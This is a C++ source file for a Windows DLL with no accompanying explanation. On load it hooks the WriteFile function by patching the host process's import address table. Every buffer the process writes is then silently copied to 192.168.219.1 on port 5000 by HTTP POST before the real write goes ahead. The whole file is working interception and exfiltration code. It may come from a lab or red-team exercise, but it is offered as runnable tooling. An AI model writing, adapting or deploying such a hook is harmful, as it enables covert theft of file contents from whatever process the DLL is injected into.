#include "pch.h"
#include <tchar.h>
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <cstring>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")

typedef BOOL(WINAPI* WriteFileProc)(
    HANDLE hFile,
    LPCVOID lpBuffer,
    DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped);

WriteFileProc OriginalWriteFile = NULL;

// Hooked WriteFile function
BOOL WINAPI MyWriteFile(
    HANDLE hFile,
    LPCVOID lpBuffer,
    DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped) {

    HINTERNET hSession = InternetOpen(L"MyHTTPAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnect(hSession, L"192.168.219.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequest(hConnect, L"POST", L"/", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
            if (hRequest) {
                BOOL sent = HttpSendRequest(hRequest, NULL, 0, (LPVOID)lpBuffer, (DWORD)nNumberOfBytesToWrite);
                if (!sent) {
                    std::cerr << "Failed to send HTTP request. Error: " << GetLastError() << std::endl;
                }
                InternetCloseHandle(hRequest);
            }
            else {
                std::cerr << "HttpOpenRequest failed. Error: " << GetLastError() << std::endl;
            }
            InternetCloseHandle(hConnect);
        }
        else {
            std::cerr << "InternetConnect failed. Error: " << GetLastError() << std::endl;
        }
        InternetCloseHandle(hSession);
    }
    else {
        std::cerr << "InternetOpen failed. Error: " << GetLastError() << std::endl;
    }

    if (OriginalWriteFile) {
        return OriginalWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    }
    return FALSE;
}

// Patch the IAT to hook WriteFile
void PatchIAT() {
    HMODULE hModule = GetModuleHandle(NULL);
    if (!hModule) {
        return;
    }
    PIMAGE_DOS_HEADER DOS_Header = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((BYTE*)hModule + DOS_Header->e_lfanew);
    PIMAGE_IMPORT_DESCRIPTOR ImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule +
        NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (ImportTable->Name) {
        const char* DllName = (const char*)((BYTE*)hModule + ImportTable->Name);

        if (_stricmp(DllName, "kernel32.dll") == 0) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + ImportTable->FirstThunk);

            while (thunk->u1.Function) {
                PROC* pFunction = (PROC*)&thunk->u1.Function;

                if (*pFunction == (PROC)WriteFile) {
                    OriginalWriteFile = (WriteFileProc)*pFunction;

                    DWORD dwOldProtect;
                    if (!VirtualProtect(pFunction, sizeof(PROC), PAGE_READWRITE, &dwOldProtect)) {
                        return;
                    }
                    *pFunction = (PROC)MyWriteFile;
                    if (!VirtualProtect(pFunction, sizeof(PROC), dwOldProtect, &dwOldProtect)) {
                        return;
                    }
                    return;
                }
                ++thunk;
            }
        }
        ++ImportTable;
    }
}

void UnpatchIAT() {
    HMODULE hModule = GetModuleHandle(NULL);
    if (!hModule) {
        return;
    }

    PIMAGE_DOS_HEADER DOS_Header = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((BYTE*)hModule + DOS_Header->e_lfanew);

    PIMAGE_IMPORT_DESCRIPTOR ImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule +
        NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (ImportTable->Name) {
        const char* DllName = (const char*)((BYTE*)hModule + ImportTable->Name);

        if (_stricmp(DllName, "kernel32.dll") == 0) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + ImportTable->FirstThunk);

            while (thunk->u1.Function) {
                PROC* pFunction = (PROC*)&thunk->u1.Function;

                if (*pFunction == (PROC)MyWriteFile) {
                    DWORD dwOldProtect;
                    if (!VirtualProtect(pFunction, sizeof(PROC), PAGE_READWRITE, &dwOldProtect)) {
                        return;
                    }
                    *pFunction = (PROC)OriginalWriteFile;
                    if (!VirtualProtect(pFunction, sizeof(PROC), dwOldProtect, &dwOldProtect)) {
                        return;
                    }
                    OriginalWriteFile = NULL;
                    return;
                }
                ++thunk;
            }
        }
        ++ImportTable;
    }
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        PatchIAT();
        break;
    case DLL_PROCESS_DETACH:
		UnpatchIAT();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

